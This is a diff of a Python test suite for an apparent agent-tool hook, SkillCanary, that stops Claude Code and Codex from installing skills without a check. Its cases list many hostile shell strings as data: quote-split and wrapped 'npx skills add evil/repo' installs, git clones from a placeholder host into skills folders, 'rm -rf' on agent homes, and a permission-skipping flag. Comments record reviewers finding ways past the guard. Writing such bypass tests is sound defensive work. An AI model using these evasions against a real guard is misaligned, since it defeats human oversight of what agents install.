@@ -684,11 +684,12 @@ assert {c["name"].split("_", 1)[0] for c in CASES} <= set(GROUPS), "case outside
 # Tool calls, not packages: each case runs `canary hook` for real, under a
 # throwaway HOME laid out like a person's (a versioned ~/.agents holding its
 # skills folder, a Claude Code skill, an ordinary repository and one that
-# carries its own .claude/skills). Program 2026-09-28 (skill edits).
+# carries its own .claude/skills). Program 2026-09-30 (back to the front
+# door): the hook stops installs that skip the check, and nothing else.
 #
 # Expectations:
-#   allow  a read, or a mention in text: the hook must stay silent
-#   deny   a write into a protected location, or a quarantine read
+#   allow  ordinary work, including reads, edits to existing skills, settings
+#   deny   an install that skips SkillCanary's check, or a quarantine read
 #
 # Placeholders: {A} the Codex user skills folder, {C} the Claude Code one,
 # {H} the absolute home, {Q} a quarantined package, {R} a repository whose
@@ -704,197 +705,177 @@ def hook_case(name, expect, command, tool="Bash", hosts=BOTH, cwd="{P}", why=Non
                 cwd=cwd, why=why)
 
 
+def write(path, content="x"):
+    return {"file_path": path, "content": content}
+
+
+def patch_add(path):
+    return {"command": f"*** Begin Patch\n*** Add File: {path}\n+x\n*** End Patch"}
+
+
 HOOK_CASES = [
-    # Reads and mentions that the 2026-09-28 distillation saw denied.
+    # Everyday work that the guard used to block (2026-09-28 to 2026-09-30).
     hook_case("H_read_ls_pipe", "allow", f"ls {A_} | head"),
     hook_case("H_read_grep_recursive", "allow", f"grep -rn routing {A_}/orchestrate"),
-    hook_case("H_read_wc_quiet", "allow", f"wc -l {A_}/orchestrate/SKILL.md 2>/dev/null"),
     hook_case("H_read_cat_head", "allow", f"cat {A_}/orchestrate/SKILL.md | head -n 20"),
-    hook_case("H_read_find_names", "allow", f"find {A_} -name '*.md' -type f"),
+    hook_case("H_read_find_exec", "allow", f"find {A_} -name '*.md' -exec wc -l {{}} +"),
     hook_case("H_read_sed_range", "allow", f"sed -n '1,40p' {A_}/orchestrate/SKILL.md"),
-    hook_case("H_read_rg", "allow", f"rg -n routing {A_}"),
-    hook_case("H_read_cd_chain", "allow", f"cd {A_} && ls && cat orchestrate/SKILL.md"),
-    hook_case("H_read_echo_mention", "allow", f"echo 'edit {A_}/orchestrate next'"),
     hook_case("H_read_git_status", "allow", "git -C ~/.agents status --short"),
-    hook_case("H_read_git_log", "allow", "git -C ~/.agents log --oneline -3"),
-    hook_case("H_read_git_diff", "allow", f"git -C ~/.agents diff -- {A_}/orchestrate"),
-    hook_case("H_read_git_cd_status", "allow", "cd ~/.agents && git status"),
-    hook_case("H_read_git_commit", "allow",
-              "cd ~/.agents && git add -A && git commit -m 'Record lessons'"),
-    hook_case("H_read_gitignore_append", "allow", "echo 'x.lock' >> ~/.agents/.gitignore"),
-    hook_case("H_read_git_checkout_plain_repo", "allow", "git checkout -b feature"),
-    hook_case("H_read_ordinary_chain", "allow", "cd src && npm test"),
+    hook_case("H_read_git_commit", "allow", "cd ~/.agents && git add -A && git commit -m 'Record lessons'"),
+    hook_case("H_read_git_checkout", "allow", "git -C ~/.agents checkout other"),
     hook_case("H_read_ask", "allow", {"questions": [{"question": f"Edit {A_}/orchestrate?",
                                                      "header": "Edit", "options": []}]},
               tool="AskUserQuestion", hosts=("claude",)),
     hook_case("H_read_spawn_task", "allow", {"title": "Fix", "prompt": f"Tidy {C_}/notes"},
               tool="mcp__ccd_session__spawn_task", hosts=("claude",)),
-    hook_case("H_read_agent", "allow", {"description": "Look", "prompt": f"Read {C_}/notes"},
-              tool="Agent", hosts=("claude",)),
-
-    # Writes stay denied, including three shapes the old parser allowed.
-    hook_case("H_write_redirect", "deny", f"echo x > {A_}/orchestrate/SKILL.md"),
-    hook_case("H_write_append_chain", "deny", f"ls && echo x >> {A_}/orchestrate/SKILL.md"),
-    hook_case("H_write_fd_redirect_cp", "deny", f"cp /etc/hosts {C_}/notes/SKILL.md 2>/dev/null",
-              why="the old parser took `2` as cp's destination"),
-    hook_case("H_write_quoted_separator", "deny", f"cp /etc/hosts /etc/shells ';' ls {C_}/notes/",
-              why="a quoted ; is an argument, so cp copies into the skill"),
-    hook_case("H_write_tee_pipe", "deny", f"echo x | tee -a {A_}/orchestrate/SKILL.md"),
-    hook_case("H_write_sed_inplace", "deny", f"sed -i '' s/a/b/ {A_}/orchestrate/SKILL.md"),
-    hook_case("H_write_sed_w_command", "deny", f"sed -n 'w {A_}/orchestrate/x.md' /etc/hosts"),
-    hook_case("H_write_find_delete", "deny", f"find {A_} -name '*.md' -delete"),
-    hook_case("H_write_find_exec", "deny", f"find {A_} -name '*.md' -exec rm {{}} +"),
-    hook_case("H_write_sort_output", "deny", f"sort -o {A_}/orchestrate/SKILL.md /etc/hosts"),
-    hook_case("H_write_rg_pre", "deny", f"rg --pre ./x.sh routing {A_}"),
-    hook_case("H_write_glob", "deny", "rm -rf ~/.claude/s*",
-              why="the glob reaches .claude/skills without naming it"),
-    hook_case("H_write_brace", "deny", "rm -rf ~/.claude/{sk,x}ills"),
-    hook_case("H_write_container", "deny", "rm -rf ~/.agents"),
-    hook_case("H_write_backslash", "deny", f"echo x > {A_}/orchestrate/new\\ file.md"),
-    hook_case("H_write_heredoc", "deny", f"cat > {A_}/orchestrate/x.md <<'EOF'\nhi\nEOF"),
-    hook_case("H_write_git_checkout_C", "deny", "git -C ~/.agents checkout other"),
-    hook_case("H_write_git_checkout_cd", "deny", "cd ~/.agents && git checkout other"),
-    hook_case("H_write_git_checkout_subfolder", "deny", "git checkout other", cwd="{H}/.agents/docs",
-              why="the repository root holds the skills folder the checkout rewrites"),
-    hook_case("H_write_git_merge", "deny", "git -C ~/.agents merge lessons/x"),
-    hook_case("H_write_git_stash", "deny", "git -C ~/.agents stash pop"),
-    hook_case("H_write_git_alias", "deny", "git -C ~/.agents co other"),
-    hook_case("H_write_git_config_flag", "deny", "git -c core.fsmonitor=./x -C ~/.agents status"),
-    hook_case("H_write_git_output", "deny", f"git -C ~/.agents log --output={A_}/o.md"),
-    hook_case("H_write_git_repo_skills", "deny", "git -C {R} reset --hard"),
-    hook_case("H_write_python_c", "deny",
-              "python3 -c \"open('{H}/.claude/" + "skills/x.md','w').write('x')\"",
-              why="a path inside a quoted program was never screened"),
-    hook_case("H_write_option_value", "deny", f"python3 tool.py --out={C_}/notes/SKILL.md"),
-    hook_case("H_write_unknown_on_container", "deny", "python3 tool.py ~/.agents"),
-    hook_case("H_write_variable", "deny", 'D="$HOME/.agents/' + 'skills"; mkdir -p "$D/x"'),
-    hook_case("H_write_mcp_tool", "deny", {"path": "{H}/.claude/" + "skills/x/SKILL.md"},
-              tool="mcp__fs__write_file"),
-    hook_case("H_write_text_tool_edit", "deny", {"file_path": "{H}/.claude/" + "skills/notes/SKILL.md",
-                                                 "old_string": "a", "new_string": "b"},
+    hook_case("H_edit_skill_shell", "allow", f"echo x >> {A_}/orchestrate/SKILL.md",
+              why="editing a skill that is already installed"),
+    hook_case("H_edit_skill_sed", "allow", f"sed -i '' s/a/b/ {A_}/orchestrate/SKILL.md"),
+    hook_case("H_edit_skill_tool", "allow", {"file_path": "{H}/.claude/" + "skills/notes/SKILL.md",
+                                             "old_string": "a", "new_string": "b"},
               tool="Edit", hosts=("claude",)),
-    # Refutation round 1 (Fable, 2026-09-29): unknown commands with relative
-    # paths, and protected locations beyond the skills folders.
-    hook_case("H_write_unknown_relative_cd", "deny", "cd ~/.claude && node w.js skills/notes/x.md"),
-    hook_case("H_write_install_relative_cd", "deny",
-              "cd ~/.agents && install -m755 /etc/hosts skills/orchestrate/x.md"),
-    hook_case("H_write_install_commands", "deny", "install -m755 /etc/hosts .claude/commands/e.md",
-              cwd="{R}"),
-    hook_case("H_write_python_commands", "deny", "python3 -c \"open('.claude/commands/e.md','w')\"",
-              cwd="{R}"),
-    hook_case("H_write_chmod_settings", "deny", "chmod 600 .claude/settings.json", cwd="{R}"),
-    hook_case("H_write_python_settings", "deny", "python3 -c \"open('.claude/settings.json','w')\"",
-              cwd="{R}"),
-    hook_case("H_write_python_mcp", "deny", "python3 -c \"open('.mcp.json','w')\"", cwd="{R}"),
-    hook_case("H_write_python_agents_md", "deny", "python3 -c \"open('AGENTS.md','w')\"", cwd="{R}"),
-    hook_case("H_write_chmod_codex_hooks", "deny", "chmod 600 .codex/hooks.json", cwd="{R}"),
-    hook_case("H_write_node_claude_json", "deny", "node w.js .claude.json", cwd="{H}"),
-    hook_case("H_write_unmapped_cd_split", "deny", "cd ~/.claude && node w.js skills/notes/x.md $V",
-              why="$ makes it unmappable, and its text names only ~/.claude"),
-    hook_case("H_read_unknown_dot", "allow", "npx prettier --check ."),
-    # Refutation round 2 (Fable, 2026-09-29).
-    hook_case("H_write_attached_option", "deny", "cd ~/.agents && cc -oskills/orchestrate/x.md main.c",
-              why="-o<path> is one word shaped like an option"),
-    hook_case("H_write_dot_in_home", "deny", "rsync -a /etc/ .", cwd="{H}"),
-    hook_case("H_write_dot_in_host_folder", "deny", "cd ~/.claude && tar -xf /tmp/x.tar ."),
-    hook_case("H_write_dotdot_to_host_folder", "deny", "cd ~/.agents/docs && tool --into .."),
-    hook_case("H_read_dot_in_skilled_repo", "allow", "npx prettier --check .", cwd="{R}",
-              why="a whole-repository tool run in a repository with a committed skill"),
-    hook_case("H_read_unknown_relative", "allow", "python3 scripts/check.py src/app.py"),
-    # Notes in the Codex home (2026-09-29): a delegation log beside Codex's
-    # config is not something Codex loads; everything around it still is.
-    hook_case("H_note_codex_log_edit", "allow", {"file_path": "{H}/.codex/delegation-log.md",
-                                                 "old_string": "a", "new_string": "b"},
-              tool="Edit", hosts=("claude",)),
-    hook_case("H_note_codex_log_append", "allow", "echo '| row |' >> ~/.codex/delegation-log.md"),
-    # The ways an agent really appends a row: the parser cannot map these, so
-    # the text screen decides (2026-09-29: the owner still hit a block).
-    hook_case("H_note_codex_printf_append", "allow",
-              "printf '%s\\n' '| row |' >> ~/.codex/delegation-log.md"),
-    hook_case("H_note_codex_heredoc_append", "allow",
+    hook_case("H_edit_skill_new_file", "allow",
+              write("{H}/.agents/" + "skills/orchestrate/references/lessons.md"),
+              tool="Write", hosts=("claude",), why="a new file inside an installed skill"),
+    hook_case("H_edit_skill_patch", "allow",
+              patch_add("{H}/.agents/" + "skills/orchestrate/references/more.md"),
+              tool="apply_patch", hosts=("codex",)),
+    hook_case("H_edit_through_link", "allow",
+              write("{H}/.claude/" + "skills/linked-orchestrate/references/x.md"),
+              tool="Write", hosts=("claude",), why="a linked skill that is installed"),
+    hook_case("H_settings_edit", "allow", write("{H}/.claude/settings.json", "{}"),
+              tool="Write", hosts=("claude",)),
+    hook_case("H_codex_log_heredoc", "allow",
               "cat >> ~/.codex/delegation-log.md <<'EOF'\n| row |\nEOF"),
-    hook_case("H_note_codex_heredoc_absolute", "allow",
-              "cat >> {H}/.codex/delegation-log.md <<'EOF'\n| a row that mentions config.toml |\nEOF"),
-    # 2026-09-30: the text screen sees the command as JSON, so a path that ends a
-    # line or sits in quotes is followed by a backslash sequence, not white space.
-    hook_case("H_note_codex_multiline_append", "allow",
-              "grep -v '^$' /etc/hosts >> ~/.codex/delegation-log.md\n"
-              "wc -l < ~/.codex/delegation-log.md; tail -n 8 ~/.codex/delegation-log.md | cut -c1-90"),
-    hook_case("H_note_codex_quoted_path", "deny",
-              "printf '%s\\n' x >> \"{H}/.codex/delegation-log.md\""),
-    hook_case("H_note_codex_tab_after_path", "allow", "echo $V >> ~/.codex/delegation-log.md\t# row"),
-    hook_case("H_note_codex_multiline_to_config", "deny",
-              "echo $V >> ~/.codex/delegation-log.md\necho $V >> ~/.codex/config.toml"),
-    hook_case("H_note_codex_multiline_to_link", "deny",
-              "echo $V >> ~/.codex/delegation-log.md\necho $V >> ~/.codex/linked.md"),
-    # Policy (after three holes in quote pairing): in the text screen a note mention
-    # with a quote directly before or after it is denied, so no quoted path is a note.
-    # Quote glue: a quote after a note name can extend the name the shell sees
-    # (Fable's second look, 2026-09-30). Four of these were allowed by main.
-    hook_case("H_note_codex_glue_single", "deny", "echo $V > ~/.codex/x.md'.config.toml'"),
-    hook_case("H_note_codex_glue_double", "deny", "echo $V > ~/.codex/x.md\"\".config.toml"),
-    hook_case("H_note_codex_glue_after_close", "deny", "echo $V > \"~/.codex/x.md\".config.toml"),
-    hook_case("H_note_codex_glue_open_single", "deny", "echo $V > ~/.codex/x.md' .config.toml'"),
-    hook_case("H_note_codex_glue_space_in_double", "deny", "echo $V > \"~/.codex/x.md .config.toml\""),
-    hook_case("H_note_codex_glue_space_in_single", "deny", "echo $V > '~/.codex/x.md .config.toml'"),
-    hook_case("H_note_codex_glue_traversal", "deny",
-              "mkdir ~/.codex/x.md; echo $V > ~/.codex/x.md'/../config.toml'",
-              why="x.md is a directory, so x.md/../config.toml is the config file"),
-    # Spark 1.3 Contributor's review: an empty quote pair before $HOME looks like
-    # an opening quote, and the quote after the name then looks like its close.
-    hook_case("H_note_codex_empty_pair_single", "deny", "echo $V > ''$HOME/.codex/x.md' .config.toml'"),
-    hook_case("H_note_codex_empty_pair_double", "deny", "echo $V > \"\"$HOME/.codex/x.md\" .config.toml\""),
-    hook_case("H_note_codex_empty_pair_braced", "deny", "echo $V > ''${HOME}/.codex/x.md' .config.toml'"),
-    hook_case("H_note_codex_empty_pair_ansi_c", "deny", "echo $V > $''$HOME/.codex/x.md' .config.toml'"),
-    hook_case("H_note_codex_empty_pair_traversal", "deny",
-              "mkdir $HOME/.codex/x.md; echo $V > ''$HOME/.codex/x.md'/../config.toml'"),
-    hook_case("H_note_codex_backslash_opener", "deny", "echo $V > \\'$HOME/.codex/x.md' .config.toml'"),
-    hook_case("H_note_codex_equals_quoted", "deny", "echo $V --out='$HOME/.codex/delegation-log.md'"),
-    hook_case("H_note_codex_leading_quote", "deny", "'$HOME/.codex/delegation-log.md' <<< $V"),
-    hook_case("H_note_codex_glue_unknown_command", "deny", "node w.js ~/.codex/x.md'.config.toml'"),
-    hook_case("H_note_codex_glue_unknown_double", "deny", "node w.js \"~/.codex/x.md\".config.toml"),
-    hook_case("H_note_codex_quoted_single", "deny", "echo $V >> '{H}/.codex/delegation-log.md'"),
-    hook_case("H_note_codex_escaped_dot_profile", "deny", "echo $V > ~/.codex/x.md\\.config.toml",
-              why="the shell reads x.md\\.config.toml as one name: a new profile"),
-    hook_case("H_note_codex_escaped_space_name", "deny", "echo $V > ~/.codex/x.md\\ y",
-              why="the shell reads x.md\\ y as one name that is no note"),
-    hook_case("H_note_codex_quoted_to_profile", "deny", "echo $V >> \"{H}/.codex/new.config.toml\""),
-    hook_case("H_note_codex_heredoc_to_config", "deny", "cat >> ~/.codex/config.toml <<'EOF'\nx\nEOF"),
-    hook_case("H_note_codex_heredoc_profile", "deny", "cat > ~/.codex/new.config.toml <<'EOF'\nx\nEOF"),
-    hook_case("H_note_codex_heredoc_agents_md", "deny", "cat >> ~/.codex/AGENTS.md <<'EOF'\nx\nEOF"),
-    hook_case("H_note_codex_heredoc_hard_link", "deny", "cat >> ~/.codex/hard.md <<'EOF'\nx\nEOF"),
-    hook_case("H_note_codex_heredoc_link", "deny", "cat >> ~/.codex/linked.md <<'EOF'\nx\nEOF"),
-    hook_case("H_note_codex_heredoc_subfolder", "deny", "cat >> ~/.codex/memories/m.md <<'EOF'\nx\nEOF"),
-    hook_case("H_note_codex_heredoc_two_targets", "deny",
-              "cat >> ~/.codex/delegation-log.md <<'EOF'\nx\nEOF\ncat >> ~/.codex/config.toml <<'EOF'\ny\nEOF"),
-    hook_case("H_note_codex_unmapped_other_folder", "deny", "echo $V >> ~/.codex-luna-worker/config.toml"),
-    hook_case("H_note_codex_agents_md", "deny", "echo x >> ~/.codex/AGENTS.md"),
-    hook_case("H_note_codex_agents_override", "deny", "echo x > ~/.codex/agents.override.md"),
-    hook_case("H_note_codex_instructions", "deny", "echo x > ~/.codex/instructions.md"),
-    hook_case("H_note_codex_new_profile", "deny", "echo x > ~/.codex/new.config.toml"),
-    hook_case("H_note_codex_subfolder", "deny", "echo x > ~/.codex/memories/note.md"),
-    hook_case("H_note_codex_prompts", "deny", "echo x > ~/.codex/prompts/review.md"),
-    hook_case("H_note_codex_models", "deny", "echo '{}' > ~/.codex/models.json"),
-    hook_case("H_note_codex_link_to_skill", "deny", "echo x >> ~/.codex/linked.md",
-              why="the note is a link into a skills folder"),
-    hook_case("H_note_codex_link_to_subfolder", "deny", "echo x >> ~/.codex/memory-link.md",
-              why="the note is a link to a file Codex loads from a subfolder"),
-    hook_case("H_note_codex_hard_link", "deny", "echo x >> ~/.codex/hard.md",
-              why="the note is a second name for a skill file"),
-    hook_case("H_note_codex_rm_home", "deny", "rm -rf ~/.codex"),
-    # The edit route: drafts are ordinary files; what Canary trusts is not.
-    hook_case("H_edit_draft_write", "allow", {"file_path": "{H}/.skillcanary/drafts/o-1/skill/SKILL.md",
-                                              "content": "x"}, tool="Write", hosts=("claude",)),
-    hook_case("H_edit_draft_shell", "allow", "echo x >> ~/.skillcanary/drafts/o-1/skill/notes.md"),
-    hook_case("H_edit_apply", "allow", "canary edit apply {H}/.skillcanary/drafts/o-1/skill"),
-    hook_case("H_edit_snapshot", "deny",
-              "echo x > '{H}/Library/Application Support/Canary/edits/r1/new/SKILL.md'"),
-    hook_case("H_edit_allowances", "deny",
-              "echo '{}' > '/Library/Application Support/SkillCanary/allowances.json'"),
-    hook_case("H_edit_log", "deny", {"file_path": "{H}/Library/Application Support/Canary/edits.jsonl",
-                                     "content": ""}, tool="Write", hosts=("claude",)),
-    hook_case("H_quarantine_pipe", "deny", "cat {Q} | head"),
-    hook_case("H_quarantine_glob", "deny", "cat ~/Library/App*/Canary/quarantine/*/package/SKILL.md"),
+    hook_case("H_codex_log_quoted", "allow", "printf '%s\\n' x >> \"$HOME/.codex/delegation-log.md\""),
+    hook_case("H_codex_config", "allow", "echo x >> ~/.codex/config.toml",
+              why="settings are not the front door's business"),
+    hook_case("H_shell_new_skill_left_to_watcher", "allow", f"mkdir -p {C_}/brand-new",
+              why="a shell command that makes a skill is caught by the watcher, not the hook"),
+    hook_case("H_python_repo_root", "allow", "python3 tool.py {H}/work/skilled"),
+    hook_case("H_mcp_write", "allow", {"path": "{P}/notes.md"}, tool="mcp__fs__write_file"),
+    hook_case("H_mcp_mentions_installer", "allow", {"text": "try npx skills add foo/bar"},
+              tool="mcp__slack__post", why="installer words in a message are not an install"),
+    # Installer help and listings print text only.
+    hook_case("H_help_plugin_install", "allow", "claude plugin install --help"),
+    hook_case("H_help_skills", "allow", "npx skills add --help"),
+    hook_case("H_list_skills_repo", "allow", "npx skills add vercel-labs/agent-skills -l"),
+
+    # Installs that skip the check: every host's installer, stopped.
+    hook_case("H_install_npx", "deny", "npx skills add someone/repo"),
+    hook_case("H_install_npx_latest", "deny", "npx -y skills@latest install x"),
+    hook_case("H_install_pnpm", "deny", "pnpm dlx skills add x"),
+    hook_case("H_install_yarn", "deny", "yarn dlx skills add x"),
+    hook_case("H_install_bunx_chain", "deny", "cd /tmp && bunx skills update"),
+    hook_case("H_install_plugin", "deny", "claude plugin install foo@bar"),
+    hook_case("H_install_marketplace", "deny", "claude plugin marketplace add someone/market"),
+    hook_case("H_install_codex_plugin", "deny", "codex plugin install foo"),
+    hook_case("H_install_help_elsewhere", "deny", "npx skills add evil/repo; echo --help",
+              why="a help flag in another command does not make the install one"),
+    hook_case("H_install_list_then_add", "deny",
+              "npx skills add evil/repo -l && npx skills add evil/repo"),
+    hook_case("H_install_git_clone", "deny", f"git clone https://example.invalid/x.git {C_}/x"),
+    hook_case("H_install_git_clone_repo", "deny",
+              "git clone https://example.invalid/x.git .claude/" + "skills/x", cwd="{R}"),
+    # A file tool creating a skill that is not there yet.
+    hook_case("H_new_skill_write", "deny", write("{H}/.claude/" + "skills/brand-new/SKILL.md"),
+              tool="Write", hosts=("claude",)),
+    hook_case("H_new_skill_codex_root", "deny", write("{H}/.agents/" + "skills/brand-new/SKILL.md"),
+              tool="Write", hosts=("claude",)),
+    hook_case("H_new_skill_repo", "deny",
+              write("{R}/.claude/" + "skills/brand-new/SKILL.md"), tool="Write", hosts=("claude",)),
+    hook_case("H_new_skill_empty_folder", "deny", write("{R}/.claude/" + "skills/x/SKILL.md"),
+              tool="Write", hosts=("claude",),
+              why="the folder exists but has no SKILL.md, so this makes the skill"),
+    hook_case("H_new_skill_other_file_first", "deny",
+              write("{H}/.claude/" + "skills/brand-new/helper.py"), tool="Write", hosts=("claude",),
+              why="any file in a skill folder that has no SKILL.md yet"),
+    hook_case("H_new_skill_patch", "deny", patch_add("{H}/.agents/" + "skills/brand-new/SKILL.md"),
+              tool="apply_patch", hosts=("codex",)),
+    hook_case("H_new_skill_case", "deny", write("{H}/.Claude/Skills/brand-new/SKILL.md"),
+              tool="Write", hosts=("claude",), why="the Mac's file system ignores case"),
+    hook_case("H_new_skill_via_link", "deny", write("{H}/skills-link/brand-new/SKILL.md"),
+              tool="Write", hosts=("claude",), why="a link that leads into a skills folder"),
+    hook_case("H_new_skill_link_out", "deny",
+              write("{H}/.claude/" + "skills/linked-empty/SKILL.md"), tool="Write", hosts=("claude",),
+              why="a link in a skills folder to an empty folder elsewhere"),
+    hook_case("H_new_skill_link_out_patch", "deny",
+              patch_add("{H}/.claude/" + "skills/linked-empty/SKILL.md"), tool="apply_patch",
+              hosts=("codex",)),
+    hook_case("H_install_plugin_alias", "deny", "claude plugin i foo@bar"),
+    # Spark 1.3 Contributor's review of slice A1 (2026-09-30): the shell reads
+    # quotes, continuations, runners and options that a text pattern misses.
+    hook_case("H_install_quoted_word", "deny", 'npx "skills" add evil/repo'),
+    hook_case("H_install_split_quote", "deny", "npx sk'ills' add evil/repo"),
+    hook_case("H_install_quoted_runner", "deny", '"npx" skills add evil/repo'),
+    hook_case("H_install_continuation", "deny", "npx \\\nskills add evil/repo",
+              why="bash joins the lines into `npx skills add`"),
+    hook_case("H_install_plugin_continuation", "deny", "claude plugin \\\ninstall foo@bar",
+              why="bash joins the lines into `claude plugin install`"),
+    hook_case("H_install_package_flag", "deny", "npx --package skills skills add evil/repo"),
+    hook_case("H_install_package_short", "deny", "npx -p skills skills add evil/repo"),
+    hook_case("H_install_npm_exec", "deny", "npm exec skills add evil/repo"),
+    hook_case("H_install_npm_exec_dashes", "deny", "npm exec -- skills add evil/repo"),
+    hook_case("H_install_pnpm_exec", "deny", "pnpm exec skills add evil/repo"),
+    hook_case("H_install_bun_x", "deny", "bun x skills add evil/repo"),
+    hook_case("H_install_npx_call", "deny", "npx -c 'skills add evil/repo'"),
+    hook_case("H_install_sh_c", "deny", "bash -c 'npx skills add evil/repo'"),
+    hook_case("H_install_env_wrapper", "deny", "env FOO=1 command npx skills add evil/repo"),
+    hook_case("H_install_substitution", "deny", "echo $(npx skills add evil/repo)"),
+    hook_case("H_install_git_global_c", "deny",
+              "git -c protocol.file.allow=always clone https://example.invalid/x.git .claude/"
+              + "skills/x", cwd="{R}"),
+    hook_case("H_install_git_dash_C", "deny",
+              "git -C /tmp clone https://example.invalid/x.git {H}/.claude/" + "skills/x"),
+    hook_case("H_install_git_into_cwd", "deny", "git clone https://example.invalid/evil.git",
+              cwd="{H}/.claude/" + "skills", why="no destination: it clones into the skills folder"),
+    hook_case("H_install_claude_global_flag", "deny",
+              "claude --dangerously-skip-permissions plugin install foo"),
+    hook_case("H_install_plugin_flag_middle", "deny", "claude plugin --scope user install foo"),
+    hook_case("H_quarantine_edit", "deny",
+              {"file_path": "{H}/Library/Application Support/Canary/quarantine/r1/package/SKILL.md",
+               "old_string": "a", "new_string": "b"}, tool="Edit", hosts=("claude",)),
+    hook_case("H_quarantine_write", "deny",
+              write("{H}/Library/Application Support/Canary/quarantine/r1/package/EVIL.md"),
+              tool="Write", hosts=("claude",)),
+    hook_case("H_quarantine_shell_read", "deny", "cat {Q}"),
+    hook_case("H_patch_malformed", "deny",
+              {"command": "*** Begin Patch \n*** Add File: {H}/.agents/" + "skills/brand-new/SKILL.md\n+x\n*** End Patch"},
+              tool="apply_patch", hosts=("codex",), why="a patch the hook cannot read fails closed"),
+    hook_case("H_heredoc_documents_installer", "deny",
+              "cat > {P}/INSTALL.md <<'EOF'\nnpx skills add vercel-labs/agent-skills\nEOF",
+              why="accepted false denial: installer words anywhere in a shell command count; "
+                  "the Write tool writes such a document"),
+    hook_case("H_git_add_skills_folder_file", "allow", "git add skills a.md i.txt",
+              why="`a` and `i` count as verbs only as whole words"),
+    hook_case("H_echo_installer_words", "deny", "echo npx skills add evil/repo",
+              why="accepted false denial: the words are enough"),
+    hook_case("H_git_separate_git_dir", "deny",
+              "git clone --separate-git-dir={H}/.claude/" + "skills/x/.git https://example.invalid/x.git /tmp/out",
+              why="accepted false denial: `clone` and a skills folder in one command"),
+    # Spark 1.3 Contributor, round 2 (2026-09-30): shell grammar has no end, so
+    # the installer's own words decide, not a parse of what runs.
+    hook_case("H_install_negated", "deny", "! npx skills add evil/repo"),
+    hook_case("H_install_continuation_in_word", "deny", "npx sk\\\nills add evil/repo",
+              why="bash joins `sk` and `ills` into `skills`"),
+    hook_case("H_install_option_before_verb", "deny", "npx skills --yes add evil/repo"),
+    hook_case("H_install_if", "deny", "if npx skills add evil/repo; then echo ok; fi"),
+    hook_case("H_install_for", "deny", "for i in 1; do npx skills add evil/repo; done"),
+    hook_case("H_install_brace_group", "deny", "{ npx skills add evil/repo; }"),
+    hook_case("H_install_function", "deny", "f() { npx skills add evil/repo; }; f"),
+    hook_case("H_install_sudo_user", "deny", "sudo -u bob npx skills add evil/repo"),
+    hook_case("H_install_env_unset", "deny", "env -u FOO npx skills add evil/repo"),
+    hook_case("H_install_timeout_signal", "deny", "timeout -s KILL 5 npx skills add evil/repo"),
+    hook_case("H_install_exec_name", "deny", "exec -a fakename npx skills add evil/repo"),
+    hook_case("H_install_variable_eval", "deny", 'X="npx skills add evil/repo"; eval "$X"'),
+    hook_case("H_install_variable_run", "deny", 'C="npx skills add evil/repo"; $C'),
+    hook_case("H_install_fake_heredoc", "deny", 'echo "<<EOF"\nnpx skills add evil/repo\nEOF'),
+    hook_case("H_install_find_exec", "deny", "find . -name f -exec npx skills add evil/repo \\;"),
+    hook_case("H_install_locale_quote", "deny", 'bash -c $"npx skills add evil/repo"'),
+    hook_case("H_install_plugin_variable", "deny", 'P="plugin install foo"; claude $P'),
+    hook_case("H_quarantine_read", "deny",
+              {"file_path": "{H}/Library/Application Support/Canary/quarantine/r1/package/SKILL.md"},
+              tool="Read", hosts=("claude",)),
 ]
 
 
@@ -914,6 +895,13 @@ class HookHome:
             fh.write("a\n")
         os.symlink(os.path.join(self.path, ".claude", "skills", "notes", "SKILL.md"),
                    os.path.join(self.path, ".codex", "linked.md"))
+        os.symlink(os.path.join(self.path, ".agents", "skills", "orchestrate"),
+                   os.path.join(self.path, ".claude", "skills", "linked-orchestrate"))
+        os.symlink(os.path.join(self.path, ".claude", "skills"),
+                   os.path.join(self.path, "skills-link"))
+        os.makedirs(os.path.join(self.path, "outside-empty"))
+        os.symlink(os.path.join(self.path, "outside-empty"),
+                   os.path.join(self.path, ".claude", "skills", "linked-empty"))
         os.link(os.path.join(self.path, ".agents", "skills", "orchestrate", "SKILL.md"),
                 os.path.join(self.path, ".codex", "hard.md"))
         os.makedirs(os.path.join(self.path, ".codex", "memories"))
@@ -980,14 +968,14 @@ class HookProbeCorpus(unittest.TestCase):
                     blocked = hook_blocked(host, proc)
                     note = f" ({c['why']})" if c["why"] else ""
                     if c["expect"] == "deny":
-                        self.assertTrue(blocked, f"write allowed{note}")
+                        self.assertTrue(blocked, f"install allowed{note}")
                     else:
-                        self.assertFalse(blocked, f"read denied: {proc.stderr.strip()[:200]}")
+                        self.assertFalse(blocked, f"ordinary work denied: {proc.stderr.strip()[:200]}")
 
-    def test_H_reads_and_mentions_pass(self):
+    def test_H_ordinary_work_passes(self):
         self.run_group("allow")
 
-    def test_H_writes_stay_denied(self):
+    def test_H_installs_that_skip_the_check_are_stopped(self):
         self.run_group("deny")
 
 
